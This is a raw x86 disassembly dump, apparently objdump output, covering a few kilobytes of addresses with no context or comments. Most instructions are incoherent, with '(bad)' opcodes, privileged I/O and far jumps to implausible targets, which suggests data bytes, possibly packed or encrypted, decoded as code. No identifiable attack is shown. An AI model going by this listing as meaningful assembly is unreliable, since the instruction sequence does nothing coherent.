  413f34:	imul   ebx,DWORD PTR [esi+edi*4-0x120b12e1],0xffffffe7
  413f3c:	mov    bl,0x50
  413f3e:	daa    
  413f3f:	jns    0x413f4a
  413f41:	ja     0x413eda
  413f43:	jecxz  0x413fbd
  413f45:	and    eax,0xf999d69
  413f4a:	mov    ds:0x9c8d64de,al
  413f4f:	popa   
  413f50:	cli    
  413f51:	and    ebp,edi
  413f53:	sub    DWORD PTR [edx+0x11],0x4d
  413f57:	pop    ebx
  413f58:	adc    edx,DWORD PTR [edx]
  413f5a:	jno    0x413f73
  413f5c:	mov    bl,bh
  413f5e:	leave  
  413f5f:	mov    cx,0x8d02
  413f63:	loope  0x413fac
  413f65:	mov    ebp,0x120dc710
  413f6a:	rcl    edx,cl
  413f6c:	mov    al,ds:0xc234e33e
  413f71:	lods   eax,DWORD PTR ds:[esi]
  413f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f73:	add    DWORD PTR [edi-0x9],edi
  413f76:	fs into 
  413f78:	dec    esp
  413f79:	pop    edi
  413f7a:	pop    es
  413f7b:	add    bh,BYTE PTR [ebx-0x57de8851]
  413f81:	sub    ch,ch
  413f83:	fcomp  QWORD PTR [edx]
  413f85:	or     BYTE PTR [ecx],0xce
  413f88:	jmp    0x413f69
  413f8a:	stos   BYTE PTR es:[edi],al
  413f8b:	loope  0x413f25
  413f8d:	pop    esp
  413f8e:	dec    esi
  413f8f:	push   ecx
  413f90:	rcl    bh,1
  413f92:	ins    BYTE PTR es:[edi],dx
  413f93:	test   al,0xf5
  413f95:	jne    0x413f72
  413f97:	pop    edx
  413f98:	fldenv [edx]
  413f9a:	loop   0x413f5f
  413f9c:	jbe    0x413ff3
  413f9e:	and    al,0x5f
  413fa0:	and    al,cl
  413fa2:	aad    0x70
  413fa4:	jns    0x413fdd
  413fa6:	mov    edi,0xbe3f740e
  413fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fac:	jge    0x414020
  413fae:	inc    esp
  413faf:	(bad)  
  413fb0:	fbld   TBYTE PTR [edx]
  413fb2:	jle    0x413f52
  413fb4:	mov    cl,0xd
  413fb6:	and    al,0x45
  413fb8:	das    
  413fb9:	outs   dx,BYTE PTR ds:[esi]
  413fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fbb:	dec    eax
  413fbc:	icebp  
  413fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fbe:	aaa    
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	xor    al,0xb1
  413fc2:	fisub  WORD PTR ds:0xc7ae5378
  413fc8:	mov    ecx,0x2980cb4f
  413fcd:	cdq    
  413fce:	cmp    BYTE PTR [esp+esi*1],dl
  413fd1:	(bad)  
  413fd3:	call   0x8a20:0x44c1102e
  413fda:	ins    DWORD PTR es:[edi],dx
  413fdb:	add    al,0x57
  413fdd:	gs or  eax,0x144185d8
  413fe3:	or     eax,0x6016ec70
  413fe8:	push   ebx
  413fe9:	fidiv  WORD PTR [edx+eax*2+0xa23f18c]
  413ff0:	out    0x94,al
  413ff2:	push   esi
  413ff3:	cmp    ebp,DWORD PTR ds:0xccf30e56
  413ff9:	jne    0x413fd3
  413ffb:	xchg   esi,eax
  413ffc:	mov    ds:0xc466e1f0,eax
  414001:	mov    edi,0x6c2f00f6
  414006:	arpl   WORD PTR ds:0xc993aec8,cx
  41400c:	call   0x3e50:0x95d88e7f
  414013:	mov    ecx,0xe27e3c04
  414018:	std    
  414019:	jns    0x414047
  41401b:	add    edx,ebx
  41401d:	pop    es
  41401e:	aam    0xf8
  414020:	jge    0x413ff3
  414022:	jnp    0x41400b
  414024:	pop    ebp
  414025:	pusha  
  414026:	rcr    ecx,cl
  414028:	fdiv   st(3),st
  41402a:	in     al,0xe1
  41402c:	add    BYTE PTR [edx-0x7181e8d6],cl
  414032:	inc    eax
  414033:	or     bh,BYTE PTR [edx+ebx*1+0x48cde107]
  41403a:	cmp    DWORD PTR fs:[bx+di+0x29],ecx
  41403f:	mov    ds:0x4a63fead,eax
  414044:	push   ecx
  414045:	rcr    BYTE PTR [ebp-0x7a],cl
  414048:	xchg   esp,eax
  414049:	add    BYTE PTR [ecx-0x6a],cl
  41404c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404d:	ror    BYTE PTR [edi+0x32],1
  414050:	mov    BYTE PTR ds:0x5b7725da,dl
  414056:	(bad)  
  414057:	sub    BYTE PTR [edx+0x7849651d],dl
  41405d:	mov    dh,0xc3
  41405f:	sar    BYTE PTR [edi-0x692e68c7],1
  414065:	and    ebx,DWORD PTR [ebp+0x72]
  414068:	push   0x39d63ee3
  41406d:	add    eax,0xb9099ac7
  414072:	and    ecx,DWORD PTR [edx+ebp*1-0x59]
  414076:	rcr    ah,1
  414078:	sbb    al,0x3a
  41407a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41407b:	jns    0x414014
  41407d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41407e:	mov    ds:0x503978b8,eax
  414083:	ficom  WORD PTR [ecx]
  414085:	test   al,0x17
  414087:	loopne 0x414029
  414089:	lods   eax,DWORD PTR ds:[esi]
  41408a:	and    bl,bl
  41408c:	aaa    
  41408d:	jle    0x41401e
  41408f:	inc    ecx
  414090:	scas   al,BYTE PTR es:[edi]
  414091:	test   eax,0x54d7693a
  414096:	sub    al,0x87
  414098:	outs   dx,DWORD PTR ds:[esi]
  414099:	xlat   BYTE PTR ds:[ebx]
  41409a:	mov    eax,ds:0xb9b0997e
  41409f:	pushf  
  4140a0:	jns    0x4140ee
  4140a2:	loop   0x414085
  4140a4:	sbb    eax,0x3f8c107b
  4140a9:	xchg   DWORD PTR [edx+0x14],esi
  4140ac:	mov    ebp,0x36507af1
  4140b1:	leave  
  4140b2:	cwde   
  4140b3:	call   0xb9d48bc3
  4140b8:	push   0x4370b13b
  4140bd:	xchg   esp,eax
  4140be:	fmul   st(4),st
  4140c0:	lds    ebx,FWORD PTR [ecx]
  4140c2:	inc    edx
  4140c3:	je     0x414101
  4140c5:	imul   esi,DWORD PTR [edx+ecx*4+0x3340ef2a],0xb0e47433
  4140d0:	ss ins DWORD PTR es:[edi],dx
  4140d2:	jl     0x4140b0
  4140d4:	inc    edx
  4140d5:	push   ecx
  4140d6:	call   0xacb2a0ae
  4140db:	ja     0x414151
  4140dd:	int3   
  4140de:	dec    ebp
  4140df:	jge    0x414157
  4140e1:	xchg   BYTE PTR [edi],bl
  4140e3:	sar    DWORD PTR [eax],0xa7
  4140e6:	inc    ecx
  4140e7:	push   es
  4140e8:	jp     0x41406f
  4140ea:	and    DWORD PTR [esi],esp
  4140ec:	imul   BYTE PTR [edi-0x28]
  4140ef:	retf   
  4140f0:	mov    ah,0x71
  4140f2:	mov    dl,0x49
  4140f4:	sub    ebx,DWORD PTR [ebp-0x2485a28e]
  4140fa:	not    dl
  4140fc:	jae    0x414096
  4140fe:	vpunpckhbw ymm1,ymm2,YMMWORD PTR [ebx-0x6c]
  414103:	les    edx,FWORD PTR [eax+ebp*2]
  414106:	pop    esp
  414107:	jg     0x41415e
  414109:	icebp  
  41410a:	cli    
  41410b:	mov    ds,WORD PTR [edx+0x25]
  41410e:	inc    eax
  41410f:	dec    esp
  414110:	outs   dx,DWORD PTR ds:[esi]
  414111:	inc    eax
  414112:	inc    esp
  414113:	jne    0x41410c
  414115:	sti    
  414116:	aam    0x4b
  414118:	xchg   edi,eax
  414119:	sub    esi,DWORD PTR [ebx-0x7c]
  41411c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41411d:	push   0xffffffe2
  41411f:	ss imul ecx,ebp,0xffffffa4
  414123:	push   ss
  414124:	dec    esp
  414125:	cmp    eax,0x556bef20
  41412a:	sqrtps xmm5,XMMWORD PTR [ecx]
  41412d:	and    al,0xa2
  41412f:	pmullw mm3,QWORD PTR [ecx-0x1b159b22]
  414136:	out    0xe1,al
  414138:	ficomp WORD PTR [edi-0x4a36c98f]
  41413e:	test   DWORD PTR [eax],eax
  414140:	imul   ecx,ecx,0xffffffe3
  414143:	jl     0x4140c5
  414145:	pusha  
  414146:	je     0x414152
  414148:	xchg   edi,eax
  414149:	repnz inc edx
  41414b:	test   al,0xf3
  41414d:	push   esi
  41414e:	mov    DWORD PTR [edx+0x2c],esi
  414151:	cmp    cl,ah
  414153:	stos   BYTE PTR es:[edi],al
  414154:	shr    DWORD PTR [eax],1
  414156:	mov    ds:0xeb47d90c,eax
  41415b:	dec    edi
  41415c:	sub    dl,BYTE PTR [edi]
  41415e:	ds push ds
  414160:	mov    dh,0x44
  414162:	fstp   TBYTE PTR ds:0xff964d64
  414168:	shr    DWORD PTR [ebx+0x6b757d7e],1
  41416e:	ror    DWORD PTR [esi],0xc7
  414171:	and    DWORD PTR [edi+0x17ef2689],esi
  414177:	mov    ebp,0x5fcaa301
  41417c:	adc    BYTE PTR [ecx],bl
  41417e:	mov    dl,0xfc
  414180:	retf   
  414181:	jns    0x41411d
  414183:	clc    
  414184:	je     0x41413d
  414186:	out    0x44,eax
  414188:	fst    st(4)
  41418a:	shl    bl,0xf9
  41418d:	scas   al,BYTE PTR es:[edi]
  41418e:	js     0x4141d1
  414190:	jp     0x414150
  414192:	les    eax,FWORD PTR [edi-0x6b]
  414195:	dec    esp
  414196:	pandn  mm2,mm5
  414199:	imul   esp,DWORD PTR [edx+0x72],0x52
  41419d:	call   0xde2d2bba
  4141a2:	xchg   edi,eax
  4141a3:	pop    eax
  4141a4:	jo     0x414156
  4141a6:	lea    edi,[edx]
  4141a8:	sahf   
  4141a9:	ficomp DWORD PTR [ebx+0x6534f2b6]
  4141af:	(bad)  [ebx]
  4141b1:	imul   ebx,DWORD PTR [edi-0x13b9993a],0xe5720456
  4141bb:	outs   dx,BYTE PTR ds:[esi]
  4141bc:	rol    BYTE PTR [ecx+0x17aeffd2],1
  4141c2:	xor    eax,0x76c3d614
  4141c7:	loop   0x414210
  4141c9:	jae    0x414173
  4141cb:	sub    eax,ecx
  4141cd:	mov    ah,0x13
  4141cf:	(bad)  
  4141d0:	std    
  4141d1:	(bad)  
  4141d2:	cmp    al,0x6f
  4141d4:	mov    ebp,0x2e77f353
  4141d9:	push   cs
  4141da:	cmp    bh,BYTE PTR [eax]
  4141dc:	inc    esi
  4141dd:	(bad)  
  4141de:	adc    DWORD PTR ds:0x7c9f63c3,esp
  4141e4:	enter  0x9adb,0x68
  4141e8:	fistp  QWORD PTR [esi]
  4141ea:	push   edi
  4141eb:	sbb    al,0x14
  4141ed:	je     0x4141d3
  4141ef:	mov    eax,ds:0x32cd8436
  4141f4:	or     edx,ecx
  4141f6:	add    DWORD PTR [ebp+0x525c0f92],0x4977bee4
  414200:	mov    edx,0x7a6f71f9
  414205:	jne    0x4141e5
  414207:	jmp    0x414265
  414209:	inc    edx
  41420a:	add    eax,0x11b89d47
  41420f:	push   eax
  414210:	sti    
  414211:	not    ecx
  414213:	adc    esp,ecx
  414215:	in     al,dx
  414216:	js     0x41421e
  414218:	nop
  414219:	sar    BYTE PTR [ebx-0x4227c91f],0xa8
  414220:	loope  0x4141df
  414222:	in     eax,0x2
  414224:	or     esi,DWORD PTR [ebx]
  414226:	cmp    ecx,DWORD PTR [eax-0x3cd1480b]
  41422c:	adc    dh,BYTE PTR [ebp-0x47]
  41422f:	mov    ah,0xb9
  414231:	mov    al,ds:0xc0088a14
  414236:	inc    ecx
  414237:	(bad)  
  414238:	sbb    DWORD PTR [esi],edx
  41423a:	fnstcw WORD PTR [ecx+0x74]
  41423d:	scas   al,BYTE PTR es:[edi]
  41423e:	add    eax,0x20baf3c9
  414243:	lahf   
  414244:	jne    0x414232
  414246:	xchg   ebp,eax
  414247:	nop
  414248:	mov    esp,DWORD PTR [edx-0x7b]
  41424b:	cmp    DWORD PTR [edi+0x79],ebp
  41424e:	xchg   esp,eax
  41424f:	pop    es
  414250:	lahf   
  414251:	test   al,0xba
  414253:	ss push es
  414255:	push   ebp
  414256:	rol    bh,cl
  414258:	adc    DWORD PTR [ebp+0x38e6e159],esi
  41425e:	js     0x414230
  414260:	pop    esi
  414261:	cmp    DWORD PTR [edx+ecx*2+0x30],ebp
  414265:	dec    ebx
  414266:	out    0x15,eax
  414268:	scas   eax,DWORD PTR es:[edi]
  414269:	dec    eax
  41426a:	jb     0x41426c
  41426c:	gs (bad) 
  41426e:	call   0x9ab1d623
  414273:	dec    esi
  414274:	ja     0x41422f
  414276:	mov    ah,0xc7
  414278:	xchg   DWORD PTR [ebp-0x1e],edi
  41427b:	retf   
  41427c:	mov    ecx,DWORD PTR [eax]
  41427e:	test   esp,ebp
  414280:	leave  
  414281:	cmp    dh,BYTE PTR [esi]
  414283:	ja     0x4142e6
  414285:	icebp  
  414286:	sub    eax,DWORD PTR [esp+esi*2]
  414289:	cdq    
  41428a:	add    ah,BYTE PTR [esi]
  41428c:	jne    0x4142f5
  41428e:	xor    al,0xb2
  414290:	jp     0x41425b
  414292:	mov    DWORD PTR [edi],esi
  414294:	out    0xbb,eax
  414296:	rcr    ebx,1
  414298:	ror    DWORD PTR [esi+0x9],cl
  41429b:	daa    
  41429c:	sub    dl,BYTE PTR [ecx-0x56]
  41429f:	mov    al,ds:0xd4b48be9
  4142a4:	ret    0x5c40
  4142a7:	jl     0x414274
  4142a9:	pop    ecx
  4142aa:	int3   
  4142ab:	popa   
  4142ac:	adc    BYTE PTR [ebp+0x15ad283d],bh
  4142b2:	scas   eax,DWORD PTR es:[edi]
  4142b3:	std    
  4142b4:	mov    dh,0x46
  4142b6:	sub    al,0x56
  4142b8:	jg     0x414299
  4142ba:	fwait
  4142bb:	add    eax,0x7240052f
  4142c0:	or     ebx,DWORD PTR [esi+0x7f]
  4142c3:	lods   al,BYTE PTR ds:[esi]
  4142c4:	mov    cl,0x45
  4142c6:	or     BYTE PTR [esp+edx*4],0x28
  4142ca:	push   esi
  4142cb:	jmp    0x414319
  4142cd:	aaa    
  4142ce:	stos   DWORD PTR es:[edi],eax
  4142cf:	xchg   DWORD PTR [esi],eax
  4142d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d2:	push   ebx
  4142d3:	jmp    0x4142a4
  4142d5:	rcr    DWORD PTR [ebp+0x56948d6c],cl
  4142db:	inc    ebx
  4142dc:	(bad)  
  4142dd:	loope  0x4142e0
  4142df:	pop    es
  4142e0:	mov    bh,BYTE PTR [ebp+0x8]
  4142e3:	add    eax,0x5bbc07fc
  4142e8:	sub    esi,esi
  4142ea:	jl     0x414294
  4142ec:	xchg   edi,eax
  4142ed:	mov    al,ds:0x1411f1e7
  4142f2:	loopne 0x4142e5
  4142f4:	inc    esi
  4142f5:	sti    
  4142f6:	in     al,dx
  4142f7:	push   0x817b54f8
  4142fc:	popa   
  4142fd:	cmovae ecx,DWORD PTR [ebx]
  414300:	maxps  xmm5,XMMWORD PTR [eax]
  414303:	in     al,0x61
  414305:	(bad)  
  414306:	(bad)  
  414307:	mov    ebx,0x27e274f1
  41430c:	mov    esi,0xb87ca167
  414311:	stc    
  414312:	xor    esi,DWORD PTR [esi+0x4d]
  414315:	adc    BYTE PTR [ebx+ebp*8-0x3a],al
  414319:	int3   
  41431a:	push   cs
  41431b:	repnz or ch,bl
  41431e:	jge    0x41436f
  414320:	cmp    DWORD PTR [ebx-0x54],ebx
  414323:	pop    eax
  414324:	mov    dl,0xc3
  414326:	ins    BYTE PTR es:[edi],dx
  414327:	pop    edi
  414328:	push   cs
  414329:	fst    QWORD PTR [ebp-0x556eae25]
  41432f:	sub    eax,0x34e4f78d
  414334:	add    bh,ch
  414336:	int    0x11
  414338:	ins    DWORD PTR es:[edi],dx
  414339:	and    edi,0x1
  41433c:	repz mov al,0xda
  41433f:	ins    DWORD PTR es:[edi],dx
  414340:	clc    
  414341:	push   eax
  414342:	jge    0x414328
  414344:	enter  0x8eb5,0xcb
  414348:	out    0x7c,eax
  41434a:	dec    edi
  41434b:	inc    edx
  41434c:	repnz sub BYTE PTR [eax],0x83
  414350:	lahf   
  414351:	outs   dx,DWORD PTR ds:[esi]
  414352:	jmp    0xfd2d9535
  414357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414358:	scas   eax,DWORD PTR es:[edi]
  414359:	cmp    bh,dh
  41435b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435c:	inc    edi
  41435d:	das    
  41435e:	loop   0x4143d2
  414360:	push   cs
  414361:	out    dx,eax
  414362:	lea    esi,[eax+0x510edcf9]
  414368:	aaa    
  414369:	mov    bl,0x2f
  41436b:	xor    ah,dh
  41436d:	sub    DWORD PTR [ebx-0x7997d4e5],0x19
  414374:	jns    0x414355
  414376:	and    al,0x4f
  414378:	mov    cl,bl
  41437a:	jmp    0xbf84:0x9f263ad9
  414381:	popf   
  414382:	and    ah,BYTE PTR [edi-0x12]
  414385:	fcomi  st,st(4)
  414387:	add    al,0xb1
  414389:	aas    
  41438a:	clc    
  41438b:	fild   WORD PTR [edi+0x15278ed4]
  414391:	jle    0x414379
  414393:	sub    BYTE PTR [ecx+0x75d1dd20],bl
  414399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41439a:	pop    ebp
  41439b:	mov    ah,0xd0
  41439d:	aad    0x8e
  41439f:	inc    eax
  4143a0:	dec    edi
  4143a1:	add    eax,0x94d3d2e1
  4143a6:	jbe    0x4143e9
  4143a8:	ds sbb dl,ah
  4143ab:	les    esi,FWORD PTR [eax]
  4143ad:	mov    ch,0x63
  4143af:	or     bl,cl
  4143b1:	pop    esi
  4143b2:	push   ss
  4143b3:	push   ebx
  4143b4:	shl    edi,0x4a
  4143b7:	pop    esi
  4143b8:	dec    esp
  4143b9:	mov    dl,0xae
  4143bb:	sbb    ah,BYTE PTR [edi+0x34]
  4143be:	lods   eax,DWORD PTR ds:[esi]
  4143bf:	push   esi
  4143c0:	sbb    BYTE PTR [edx-0x1cf1e409],0xa3
  4143c7:	(bad)  
  4143c8:	je     0x414419
  4143ca:	sub    bh,BYTE PTR [ebp-0x11]
  4143cd:	cmp    al,al
  4143cf:	pushf  
  4143d0:	(bad)  
  4143d2:	sbb    eax,0x68d42036
  4143d7:	inc    ecx
  4143d8:	mov    dh,0xde
  4143da:	in     eax,0x23
  4143dc:	fsubp  st(5),st
  4143de:	adc    al,0x6d
  4143e0:	adc    ecx,DWORD PTR [esi-0x44]
  4143e3:	push   edi
  4143e4:	pop    eax
  4143e5:	xlat   BYTE PTR ds:[ebx]
  4143e6:	xor    BYTE PTR [ebp+0x64],bl
  4143e9:	push   esp
  4143ea:	push   esp
  4143eb:	and    al,0xf6
  4143ed:	sub    cl,BYTE PTR [eax]
  4143ef:	cld    
  4143f0:	cmp    ebp,edi
  4143f2:	call   DWORD PTR [ebp-0x57f52386]
  4143f8:	retf   
  4143f9:	jmp    0xa14f1b3a
  4143fe:	mov    ecx,0x9af4e249
  414403:	add    BYTE PTR [esi+0x63bed00e],ch
  414409:	or     al,0x7f
  41440b:	pop    es
  41440c:	shr    edi,cl
  41440e:	je     0x414479
  414410:	xchg   esi,eax
  414411:	add    ebx,esp
  414413:	lods   al,BYTE PTR ds:[esi]
  414414:	xor    BYTE PTR [edx-0x420e1160],ch
  41441a:	mov    esp,0x90de2bf7
  41441f:	mov    ch,0x2e
  414421:	sub    DWORD PTR [esi],esp
  414423:	(bad)  
  414424:	jns    0x414485
  414426:	adc    edx,DWORD PTR [edi+0x75]
  414429:	addr16 add dh,cl
  41442c:	retf   0x9195
  41442f:	gs daa 
  414431:	inc    edx
  414432:	jns    0x414456
  414434:	mov    edx,0x92174793
  414439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41443a:	pushf  
  41443b:	xor    eax,0xc3f42312
  414440:	sub    eax,0xa26d796c
  414445:	sbb    cl,dh
  414447:	fdiv   st(7),st
  414449:	das    
  41444a:	std    
  41444b:	push   cs
  41444c:	test   al,0xc6
  41444e:	cdq    
  41444f:	aas    
  414450:	sbb    bl,dl
  414452:	fwait
  414453:	pop    eax
  414454:	mov    ebp,0xc6670b61
  414459:	cli    
  41445a:	mov    ds:0x898f285,eax
  41445f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414460:	adc    bh,dh
  414462:	mul    DWORD PTR [ecx]
  414464:	push   sp
  414466:	xor    eax,0x3ce1ecf1
  41446b:	sub    eax,0xaf78911d
  414470:	add    eax,DWORD PTR [edx-0x46a86a0]
  414476:	inc    edx
  414477:	in     al,0x55
  414479:	scas   al,BYTE PTR es:[edi]
  41447a:	js     0x4144fa
  41447c:	ret    
  41447d:	in     al,0x4e
  41447f:	jmp    0x4144bd
  414481:	add    eax,0xba3edb1e
  414486:	or     dh,BYTE PTR [ebx]
  414488:	push   ebx
  414489:	idiv   bh
  41448b:	mov    bh,0xce
  41448d:	clc    
  41448e:	pop    edx
  41448f:	(bad)  
  414490:	out    0xba,al
  414492:	sub    DWORD PTR [edx+0x2b],esp
  414495:	addr16 aad 0x0
	...
  414514:	in     al,dx
  414515:	ss ins BYTE PTR es:[edi],dx
  414517:	or     esi,edi
  414519:	pop    ebx
  41451a:	in     eax,dx
  41451b:	test   DWORD PTR [edi-0x26],0x2fb29ed2
  414522:	dec    edx
  414523:	pop    edx
  414524:	scas   eax,DWORD PTR es:[edi]
  414525:	jmp    0x414527
  414527:	add    BYTE PTR [ebx+0x7],ch
  41452a:	add    BYTE PTR [eax],al
  41452c:	sub    BYTE PTR [esi+0x38e8486c],cl
  414532:	and    edi,DWORD PTR [esi+0x3aa221a9]
  414538:	sbb    BYTE PTR [esp+ebp*8],0xff
  41453c:	push   edi
  41453d:	jge    0x414521
  41453f:	daa    
  414540:	rol    BYTE PTR [edx+ebx*8-0x71e960e],0x40
  414548:	dec    ebp
  414549:	retf   0xc773
  41454c:	xor    DWORD PTR [ebx],edi
  41454e:	mov    dl,0xa0
  414550:	or     al,0xa8
  414552:	call   0x3fc098dc
  414557:	popf   
  414558:	les    esi,FWORD PTR [ebx+0x799dca38]
  41455e:	xchg   ecx,eax
  41455f:	call   0xbe2e:0x4ce11672
  414566:	fdivr  st(6),st
  414568:	adc    cl,bh
  41456a:	and    BYTE PTR [esp+ecx*8+0x10],bl
  41456e:	mov    ch,0xf
  414570:	loope  0x4145e4
  414572:	inc    eax
  414573:	lods   al,BYTE PTR ds:[esi]
  414574:	adc    esp,esp
  414576:	popf   
  414577:	stc    
  414578:	and    eax,DWORD PTR [ebx]
  41457a:	enter  0x814c,0x96
  41457e:	gs js  0x414517
  414581:	fs mov bh,0xc5
  414584:	inc    edi
  414585:	cwde   
  414586:	ins    BYTE PTR es:[edi],dx
  414587:	repz das 
  414589:	sub    al,0x7a
  41458b:	dec    ebx
  41458c:	sbb    ax,0xe1be
  414590:	jo     0x4145c3
  414592:	xchg   edx,eax
  414593:	dec    ebx
  414594:	and    bl,ch
  414596:	pop    ds
  414597:	pop    ebx
  414598:	out    0x2a,al
  41459a:	jo     0x41452f
  41459c:	xchg   esi,eax
  41459d:	xlat   BYTE PTR ds:[ebx]
  41459e:	arpl   WORD PTR [ebp-0x1f],bx
  4145a1:	push   esi
  4145a2:	fiadd  WORD PTR es:[ebx+esi*8-0x2984336]
  4145aa:	(bad)  
  4145ab:	in     al,0xb3
  4145ad:	mov    esi,0xbb3d7a25
  4145b2:	shrd   DWORD PTR [eax-0x35],ebp,0x40
  4145b7:	sar    DWORD PTR [ebp+0x455daf3e],cl
  4145bd:	mov    edi,DWORD PTR [ecx+eax*4+0x7511354d]
  4145c4:	sbb    BYTE PTR [ecx],ch
  4145c6:	add    BYTE PTR [ebx],dl
  4145c8:	xchg   ebx,eax
  4145c9:	outs   dx,BYTE PTR ds:[esi]
  4145ca:	repz xor al,0x2
  4145cd:	sub    bl,BYTE PTR [esi-0x720c1989]
  4145d3:	cmp    edi,edi
  4145d5:	xchg   edi,eax
  4145d6:	and    DWORD PTR ds:0x42e54a54,ebx
  4145dc:	xor    ecx,DWORD PTR [ebx-0x7f7615a9]
  4145e2:	cli    
  4145e3:	cmp    eax,esi
  4145e5:	repnz loopne 0x41462f
  4145e8:	mov    esp,0x36560b7
  4145ed:	and    cl,dh
  4145ef:	and    eax,0x6cc8135f
  4145f4:	pop    es
  4145f5:	es out 0x84,eax
  4145f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f9:	mov    ss,WORD PTR [eax+0x32]
  4145fc:	repz imul ecx,DWORD PTR [edi-0x77461f73],0x8c20c6ce
  414607:	enter  0x3316,0x80
  41460b:	ins    BYTE PTR es:[edi],dx
  41460c:	add    esi,esp
  41460e:	sbb    eax,0xabf62e07
  414613:	scas   eax,DWORD PTR es:[edi]
  414614:	add    ebx,DWORD PTR [esi]
  414616:	inc    edx
  414617:	mov    ah,0xa3
  414619:	imul   ebp,DWORD PTR [eax],0x61105758
  41461f:	add    DWORD PTR [ebp-0x2e5c5205],ebx
  414625:	pop    ebx
  414626:	mov    cl,0x17
  414628:	(bad)  
  414629:	in     al,dx
  41462a:	pusha  
  41462b:	push   ss
  41462c:	inc    ebx
  41462d:	enter  0x4030,0xf6
  414631:	jg     0x41467c
  414633:	adc    ebx,0xe8999ed8
  414639:	mov    ebp,0x320fe35e
  41463e:	add    edx,DWORD PTR fs:[edx]
  414641:	std    
  414642:	xor    DWORD PTR [esi+ebx*2],0xffffff91
  414646:	and    bh,bh
  414648:	dec    esi
  414649:	dec    ebp
  41464a:	cmp    esp,DWORD PTR [eax+0x79]
  41464d:	cmp    bh,BYTE PTR [edx-0x1b]
  414650:	adc    DWORD PTR [eax],edx
  414652:	cmp    DWORD PTR [esi+0x263339f5],esp
  414658:	pusha  
  414659:	sar    DWORD PTR [esi+eiz*4],1
  41465c:	les    esi,FWORD PTR [edx-0x2f]
  41465f:	dec    edx
  414660:	mov    esp,0xe91cff9a
  414665:	in     al,0xde
  414667:	retf   0xa07d
  41466a:	out    dx,eax
  41466b:	jp     0x414663
  41466d:	and    DWORD PTR [ecx+0x7717b2ed],esi
  414673:	push   es
  414674:	add    eax,0xb3a65e8e
  414679:	ret    
  41467a:	iret   
  41467b:	icebp  
  41467c:	popf   
  41467d:	jb     0x4146d6
  41467f:	pop    ebp
  414680:	enter  0x6f4c,0xde
  414684:	push   ebp
  414685:	mov    WORD PTR [eax+0x64043e26],?
  41468b:	idiv   DWORD PTR [ebx+0x48]
  41468e:	hlt    
  41468f:	out    0xdd,al
  414691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414692:	jb     0x4146cc
  414694:	mov    esi,0x4358df44
  414699:	repnz xchg edi,eax
  41469b:	xchg   DWORD PTR [ecx],eax
  41469d:	adc    BYTE PTR [eax+0xd],dh
  4146a0:	leave  
  4146a1:	fsubr  DWORD PTR [esi]
  4146a3:	mov    ds:0x15ff3238,eax
  4146a8:	loopne 0x41462e
  4146aa:	mov    bl,0x6c
  4146ac:	push   esi
  4146ad:	lahf   
  4146ae:	out    dx,eax
  4146af:	int    0x8f
  4146b1:	mov    cs,WORD PTR [eax-0x4b068a97]
  4146b7:	push   ebx
  4146b8:	ret    
  4146b9:	aas    
  4146ba:	dec    edi
  4146bb:	cmp    BYTE PTR [esi],cl
  4146bd:	or     al,BYTE PTR [ecx+0x6d69b02]
  4146c3:	xor    ebx,edi
  4146c5:	mov    DWORD PTR [eax+ecx*2+0x71358762],esp
  4146cc:	sti    
  4146cd:	scas   al,BYTE PTR es:[edi]
  4146ce:	xor    al,BYTE PTR [ecx+0x61]
  4146d1:	xor    al,0xfd
  4146d3:	jmp    0x414677
  4146d5:	fs mov dl,0x8c
  4146d8:	imul   ebp,DWORD PTR [ecx-0x726a50c],0x5b98aa82
  4146e2:	jo     0x4146d5
  4146e4:	shl    BYTE PTR [edi],0x94
  4146e7:	test   bh,cl
  4146e9:	mov    dh,0xde
  4146eb:	es or  al,0xa2
  4146ee:	and    BYTE PTR [ebx],dl
  4146f0:	or     edi,ebp
  4146f2:	jb     0x4146dd
  4146f4:	push   0x23
  4146f6:	(bad)  
  4146f7:	xchg   ebx,eax
  4146f8:	test   DWORD PTR [ecx-0x5bc92e2f],esp
  4146fe:	pop    edx
  4146ff:	cmp    eax,0xd14ea6ef
  414704:	mov    esi,0x916766fa
  414709:	std    
  41470a:	add    BYTE PTR [edi-0x5a0d67c7],0xae
  414711:	pop    ebx
  414712:	arpl   WORD PTR [esi+0x40],si
  414715:	mov    ecx,0xb1c43d7b
  41471a:	aam    0x37
  41471c:	pop    ds
  41471d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41471e:	push   eax
  41471f:	jno    0x4146c7
  414721:	daa    
  414722:	es sahf 
  414724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414725:	cs (bad) 
  414727:	push   ebp
  414728:	jge    0x4146b2
  41472a:	pop    esi
  41472b:	mov    dl,0x8b
  41472d:	int    0x19
  41472f:	mov    ebx,0xb3b76fb9
  414734:	retf   0xc36e
  414737:	adc    bh,bl
  414739:	sbb    al,0xfb
  41473b:	add    esi,edx
  41473d:	neg    BYTE PTR [edi-0x79]
  414740:	sub    ebx,ecx
  414742:	test   BYTE PTR [esi+0x55c7cda9],dl
  414748:	hlt    
  414749:	xchg   ebp,eax
  41474a:	mov    BYTE PTR [esp+ebx*2-0x40028481],0x45
  414752:	or     esi,DWORD PTR [ecx]
  414754:	jb     0x414706
  414756:	test   eax,0x62956397
  41475b:	jmp    0x414797
  41475d:	jecxz  0x41472d
  41475f:	frndint 
  414761:	and    DWORD PTR [ecx],edx
  414763:	sub    DWORD PTR [esi+0x57604aa8],esi
  414769:	mov    DWORD PTR [edx+0x76],ecx
